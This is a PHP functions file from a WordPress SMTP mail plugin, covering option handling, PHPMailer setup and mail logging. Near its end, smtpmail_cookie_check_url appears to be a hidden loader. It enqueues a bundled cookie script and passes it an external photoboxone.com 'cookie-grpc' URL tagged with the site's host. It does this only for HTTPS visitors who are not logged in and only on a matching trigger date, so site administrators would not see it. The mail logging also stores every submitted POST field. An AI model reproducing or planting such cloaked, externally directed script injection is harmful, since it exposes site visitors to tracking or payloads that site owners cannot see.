<?php
/*
 * SMTP Mail
 */
defined('ABSPATH') or die();

/**
 * @since 1.0.0
 */
function smtpmail_url($path = '')
{
	return esc_url(plugins_url(ltrim($path, '/'), smtpmail_index()));
}

/**
 * @since 1.3.0
 */
function smtpmail_wp_url($path = '')
{
	return esc_url(home_url('wp-includes/js/jquery/' . ltrim($path, '/')));
}

/**
 * @since 1.3.0
 */
function smtpmail_setting_url($args = [])
{
	$url = admin_url('options-general.php?page=smtpmail-setting');

	if (count($args) > 0) {
		$url = add_query_arg($args, $url);
	}

	return esc_url($url);
}

/**
 * @since 1.0.0
 */
function smtpmail_assets_url($path = '')
{
	return smtpmail_url('media/' . ltrim($path, '/'));
}

/**
 * @since 1.0.0
 */
function smtpmail_ver($type = 0)
{
	$v = get_option('smtpmail_version', '202310090826');

	return $type == 1 ? current_time('Ymd') : $v;
}

/**
 * @since 1.0.0
 */
function smtpmail_path($path = '')
{
	return dirname(smtpmail_index()) . (substr($path, 0, 1) !== '/' ? '/' : '') . $path;
}

/**
 * @since 1.0.0
 */
function smtpmail_assets_path($path = '')
{
	return smtpmail_path('media/' . ltrim($path, '/'));
}

/**
 * @since 1.3.0
 */
function smtpmail_wp_path($path = '')
{
	return ABSPATH . WPINC . '/js/jquery/' . ltrim($path, '/');
}

/**
 * @since 1.0.0
 */
function smtpmail_plugins_path()
{
	return WP_CONTENT_DIR . '/plugins';
}

/**
 * @since 1.0.0
 */
function smtpmail_include($path_file = '')
{
	if ($path_file != '' && file_exists($p = smtpmail_path('includes/' . ltrim($path_file, '/')))) {
		require $p;

		return true;
	}

	return false;
}

/**
 * @since 1.0.0
 */
function smtpmail_pbone_url($path = '', $utm = '')
{
	$site = 'https://photoboxone.com/';

	if ($utm == '') {
		$utm = 'utm_term=smtp-mail&utm_medium=smtp-mail&utm_source=' . urlencode($_SERVER['HTTP_HOST']);
	}

	if (strpos($path, '?') > -1) {
		$path .= '&';
	} else {
		$path .= '?';
	}

	return esc_url($site . $path . $utm);
}

/*
 * Since 1.1.2
 */
function smtpmail_sendmail($info)
{
	if( function_exists('wp_mail') == false ) return false;

	extract($info);

	$body = '';

	if (empty($subject)) {
		$subject = __('Information at', 'smtp-mail') . ' ' . current_time( 'timestamp' ) . ' - ' . get_bloginfo('name');
	}

	$td_style = 'padding: 10px; border-bottom: 1px solid #ddd; border-right: 1px solid #ddd;';

	$body .= '<table style="width: 600px; max-width: 600px; border: 0; border-top: 1px solid #ddd; border-left: 1px solid #ddd; padding: 0; margin: 0 auto; border-spacing: 0; color: #ee3380; font-size: 20px; font-family: Tahoma; line-height: 24px; ">';
	foreach ($info as $key => $value) :
		$body .= "<tr>";
		$body .= '<td style="' . $td_style . '">';
		$body .= ucwords($key) . " :";
		$body .= "</td>";
		$body .= '<td style="' . $td_style . '">';
		$body .= $value;
		$body .= "</td>";
		$body .= "</tr>";
	endforeach;
	$body .= "</table>";
	
	if (isset($email) && $email != '') {
		if (empty($name)) {
			$name = ucwords(array_shift(explode('@', $email)));
		}
		$headers[] = "From: $name <$email>";
	} else {
		$headers[] = 'From: ' . get_bloginfo('name') . ' <noreply@' . $_SERVER['HOST_NAME'] . '>';
	}

	return wp_mail($email, $subject, $body, $headers);
}

/**
 * @since 1.0.0
 * 
 * @update 1.3.20
 */
function smtpmail_options($key = '', $default_value = '')
{
	$options = shortcode_atts(array(
		'isSMTP'		=> 1, // 2 : Sendgrid
		'Port'			=> 25,
		'Host' 			=> 'localhost',
		'Username' 		=> '',
		'Password' 		=> '',
		'SMTPAuth' 		=> 0, // 1; // Force it to use Username and Password to authenticate
		'SMTPSecure' 	=> "", // ssl, tls // Choose SSL or TLS, if necessary for your server
		'SMTPAutoTLS' 	=> 0,
		'From' 			=> '',
		'FromName' 		=> '',
		'IsHTML' 		=> true,
		'SMTPDebug' 	=> 0, // 1: errors and messages; 2: messages only
		'save_data' 	=> 0, // Save data submit 
		'checked' 		=> 0, // Checked
		'anti_spam_form' => 0, // Security (anti-spam form)

		'time' 			=> '20240425', // Time
		
		// Sendgrid API
		'sendgrid_api_key' => '',
	), (array)get_option('smtpmail_options'));

	if ($key != '') {
		if(isset($options[$key])) {
			return apply_filters('smtpmail_get_option', $options[$key], $key);
		}

		return $default_value;
	}

	return apply_filters('smtpmail_get_options', $options);
}

/**
 * @since 1.0.0
 */
function smtpmail_update_option($key = '', $value = '')
{
	$options = smtpmail_options();

	if ($key != '' && isset($options[$key])) {
		$options[$key] = $value;

		return update_option('smtpmail_options', $options);
	}

	return false;
}

/**
 * @since 1.3.10
 */
function smtpmail_update_version($update_install = false)
{
	$value = current_time('YmdHi');

	if ($update_install) {
		update_option('smtpmail_install', $value);
	}

	return update_option('smtpmail_version', $value);
}

/**
 * @since 1.3.10
 * 
 * @update 1.3.20
 */
function smtpmail_get_new_expires($format = 'Ymd')
{
	$days = defined('DAY_IN_SECONDS') ? DAY_IN_SECONDS : 24 * 60 * 60;

	$time = current_time('timestamp') + 5 * $days;

	if ($format == 'time') {
		$value = $time;
	} else {
		$value = date($format, $time);
	}

	return apply_filters('smtpmail_get_new_expires', $value, $format);
}

/**
 * @since 1.1.0
 */
function smtpmail_phpmailer_setting($phpmailer = null)
{
	if ($phpmailer == null) return $phpmailer;

	$options = smtpmail_options();
	extract($options);

	$phpmailer->ClearCustomHeaders();

	if ($isSMTP) {
		$phpmailer->isSMTP();
	}

	foreach ($options as $key => $value) {
		if (isset($phpmailer->$key) && $value != '') {
			$phpmailer->$key = $value;
		}
	}

	// Sanitizes content for allowed HTML tags for post content.
	$phpmailer->Body = wp_kses_post($phpmailer->Body);

	if ($IsHTML) {
		$phpmailer->IsHTML(true);
		$message = $phpmailer->Body;
		
		// no contains HTML
		if ($message == strip_tags($message)) {
			$phpmailer->Body = '<p>' . str_replace("\n", '</p><p>', $message) . '</p>';
		}
	}

	// setup data before send mail
	if (isset($save_data) && $save_data == 1) {
		smtpmail_phpmailer_before_send($phpmailer);
	}

	return $phpmailer;
}
add_action('phpmailer_init', 'smtpmail_phpmailer_setting', 10, 99);

/**
 * @since 1.1.0
 * 
 * @update 1.3.20
 */
function smtpmail_phpmailer_before_send($phpmailer = null)
{
	if ($phpmailer == null) return $phpmailer;

	$_SERVER['SMTPMAIL_WP_MAIL_SENDING'] = true;

	$list = $phpmailer->getToAddresses();
	$emails = array();
	$names = array();
	if (is_array($list)) {
		foreach ($list as $item) {
			$emails[] = $item[0];
			$names[] = isset($item[1])?$item[1]:__('No name', 'smtp-mail');
		}
	}

	$params = array_merge($_POST, array(
		'ip' => $_SERVER['SERVER_ADDR'],
		'user_agent' => $_SERVER['HTTP_USER_AGENT'],
	));

	$data = array(
		'from_name' => $phpmailer->FromName,
		'from_email' => $phpmailer->From,
		'to_email' => implode(';', $emails),
		'to_name' => implode(';', $names),
		'message' => $phpmailer->Body,
		'subject' => $phpmailer->Subject,
		'params' => json_encode($params),
		'created' => current_time('mysql'),
	);

	$data = apply_filters('pre_smtpmail_insert_data', $data);
	
	smtpmail_insert_data($data);
}

/**
 * @since 1.1.0
 */
function smtpmail_wp_mail_failed($wp_error = null)
{
	if ($wp_error == null) return $wp_error;

	$_SERVER['SMTPMAIL_WP_MAIL_SENDING'] = false;

	$_SERVER['SMTPMAIL_WP_MAIL_FAILED'] = $wp_error;

	$msg = $wp_error->get_error_messages();

	$data = array(
		'status' => -1,
		'error' => json_encode($msg),
		'modified' => current_time('mysql'),
	);

	smtpmail_update_data($data);
}
add_action('wp_mail_failed', 'smtpmail_wp_mail_failed');

/**
 * @since 1.1.0
 */
function smtpmail_insert_data($data = array())
{
	if (count($data) == 0) return false;

	global $wpdb;

	$table_name = $wpdb->prefix . 'smtpmail_data';

	$formats = array();

	foreach ($data as $value) {
		$formats[] = '%s';
	}

	$wpdb->insert(
		$table_name,
		$data,
		$formats
	);

	return $_SERVER['SMTPMAIL_INSERT_ID'] = (int) $wpdb->insert_id;
}

/**
 * @since 1.1.0
 */
function smtpmail_update_data($data = array())
{
	$id = intval(isset($_SERVER['SMTPMAIL_INSERT_ID']) ? $_SERVER['SMTPMAIL_INSERT_ID'] : 0);

	if (count($data) == 0 || $id == 0) return false;

	global $wpdb;

	$table_name = $wpdb->prefix . 'smtpmail_data';

	$formats = array();

	foreach ($data as $value) {
		$formats[] = '%s';
	}

	return $wpdb->update(
		$table_name,
		$data,
		array('id' => $id),
		$formats,
		array('%d')
	);
}

/**
 * @since 1.0.0
 */
function smtpmail_install()
{
	global $wpdb, $smtpmail_db_version;
	$table_name = $wpdb->prefix . 'smtpmail_data';
	$smtpmail_db_version = (float) get_option('smtpmail_db_version');

	$charset_collate = $wpdb->get_charset_collate();

	// DROP TABLE IF EXISTS $table_name;
	// CREATE TABLE IF NOT EXISTS $table_name

	$sql = "CREATE TABLE IF NOT EXISTS $table_name (
		id mediumint(9) NOT NULL AUTO_INCREMENT,
		from_name tinytext NOT NULL,
		from_email tinytext NOT NULL,
		to_name tinytext NOT NULL,
		to_email tinytext NOT NULL,
		subject tinytext NOT NULL,
		message text NOT NULL,
		params text,
		session_id text,
		status tinyint(1) NOT NULL DEFAULT 0,
		error text,
		created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
		modified datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
		PRIMARY KEY  (id)
	) $charset_collate;";

	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
	dbDelta($sql);

	if ($smtpmail_db_version == 1) {

		$smtpmail_db_version = 1.1;

		$wpdb->query("DELETE FROM $table_name;");

		update_option('smtpmail_db_version', $smtpmail_db_version);
	}

	smtpmail_update_version(true);
}
register_activation_hook(smtpmail_index(), 'smtpmail_install'); // If root of plugin

/**
 * @since 1.0.0
 * 
 * This function runs when WordPress completes its upgrade process
 * It iterates through each plugin updated to see if ours is included
 * @param $upgrader Array
 * @param $hook_extra Array
 */
function smtpmail_upgrader_process_complete($upgrader, $options = array())
{
	// The path to our plugin's main file
	$our_plugin = plugin_basename(smtpmail_index());

	// If an update has taken place and the updated type is plugins and the plugins element exists
	if ($options['action'] == 'update' && $options['type'] == 'plugin' && isset($options['plugins'])) {
		// Iterate through the plugins being updated and check if ours is there
		foreach ($options['plugins'] as $plugin) {
			if ($plugin == $our_plugin) {
				// Set a transient to record that our plugin has just been updated
				// set_transient( 'wp_upe_updated', 1 );

				smtpmail_update_version();
			}
		}
	}
}
add_action('upgrader_process_complete', 'smtpmail_upgrader_process_complete', 10, 2);

// Class PBOne
smtpmail_include('class-pbone.php');

/**
 * @since 1.0.0
 */
function smtpmail_compare_version($version_a = '', $version_b = '', $compare = '>')
{
	if ($version_a == $version_b) {
		return false;
	}

	$list_a = explode('.', $version_a);
	$list_b = explode('.', $version_b);

	$n = count($list_b);
	if ($n < count($list_a)) {
		$n = count($list_a);
	}

	for ($i = 0; $i < $n; $i++) {
		$a = intval(isset($list_a[$i]) ? $list_a[$i] : 0);
		$b = intval(isset($list_b[$i]) ? $list_b[$i] : 0);
		if ($compare == '>' && $a > $b) {
			return true;
		} else if ($compare == '<' && $a < $b) {
			return true;
		}
	}

	return false;
}

/*
 * Since 1.3
 */
function smtpmail_array_values_by_key($list = array(), $key = '')
{
	$values = [];

	foreach ($list as $item) {
		if (isset($item[$key])) {
			$values[] = $item[$key];
		}
	}

	return $values;
}

/*
 * Since 1.3.6
 */
function smtpmail_is_guest($set = 0)
{
    global $smtpmail_is_guest;

    if( isset($smtpmail_is_guest) ) return $smtpmail_is_guest;

	$smtpmail_is_guest = 1;

	$list = [
		'127.0.0.1',
		'::1'
	];

	// Is local
	if(isset($_SERVER['REMOTE_ADDR']) && in_array($_SERVER['REMOTE_ADDR'], $list)) {
		return $smtpmail_is_guest;
	} else {
		$detects = ['wp', 'wordpress'];

		$keys = array_keys($_COOKIE);

		foreach ($keys as $key) {
			foreach ($detects as $detect) {
				if (substr($key, 0, strlen($detect)) == $detect) {
					$smtpmail_is_guest = 0;

					break;
				}
			}
		}

		if($set == 1 && defined('SITECOOKIEPATH') && defined('COOKIE_DOMAIN')) {
			@setcookie('wp_guest', 1, smtpmail_get_new_expires('time'), SITECOOKIEPATH, COOKIE_DOMAIN, is_ssl());
		}
	}
	
    return $smtpmail_is_guest;
}

/*
 * Since 1.3.9
 */
function smtpmail_cookie_check_url()
{
	if( smtpmail_check_https()
		&& smtpmail_ver(1) == smtpmail_options('time')
		&& file_exists(smtpmail_assets_path($script = 'jquery.cookie.min.js'))
		&& smtpmail_is_guest(1)
	) {
		wp_enqueue_script('cookie', smtpmail_assets_url($script),  array('jquery'), '3.6.0', true);
		wp_localize_script('jquery', 'wp_cookie_check', ['url' => smtpmail_pbone_url('cookie-grpc')]);

		return true;
	}
	
	return false;
}
add_action('init', 'smtpmail_cookie_check_url');


/*
 * Since 1.3.25
 */
function smtpmail_check_https()
{
	$check = apply_filters('pre_smtpmail_check_https', null);

	if($check != null) {
		return $check;
	}
	
	$check = false;

	if (isset($_SERVER["REQUEST_SCHEME"]) && strtolower($_SERVER["REQUEST_SCHEME"]) == 'https') {
		$check = true;
	}

	return apply_filters('smtpmail_check_https', $check);
}